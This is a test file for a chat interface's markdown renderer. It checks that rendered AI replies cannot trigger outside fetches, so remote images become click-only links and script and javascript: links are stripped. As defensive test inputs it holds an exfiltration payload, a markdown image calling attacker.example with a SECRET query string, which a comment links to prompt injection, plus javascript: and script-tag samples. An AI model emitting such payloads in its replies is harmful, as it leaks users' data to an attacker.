import assert from 'node:assert/strict';
import { test } from 'node:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { safe } from '../src/ui/safe.ts';

const html = (markdown: string) => renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components: safe }, markdown));

test('a reply cannot make the page fetch anything: only the profile\'s own images are drawn, and a link waits for a click', () => {
  // An image elsewhere would send its address, and whatever a prompt injection put in it, the moment the reply is shown.
  const remote = html('![chart](https://attacker.example/p.png?d=SECRET)');
  assert.doesNotMatch(remote, /<img|<link|preload/);
  assert.equal(remote, '<p><a href="https://attacker.example/p.png?d=SECRET" target="_blank" rel="noreferrer noopener">chart</a></p>');
  for (const address of ['//attacker.example/p.png', '/images/work/../../elsewhere', 'http://127.0.0.1:4780/images/work/0123456789abcdef', 'data:image/png;base64,AAAA'])
    assert.doesNotMatch(html(`![x](${address})`), /<img/, address);
  assert.match(html('![shot](/images/work/0123456789abcdef)'), /<p><img src="\/images\/work\/0123456789abcdef" alt="shot"\/><\/p>$/);

  assert.equal(html('[docs](https://example.com/a)'), '<p><a href="https://example.com/a" target="_blank" rel="noreferrer noopener">docs</a></p>');
  assert.doesNotMatch(html('[run](javascript:alert(1)) and <img src="https://attacker.example/x.png"> and <script>alert(1)</script>'), /javascript:|<img|<script/);
});
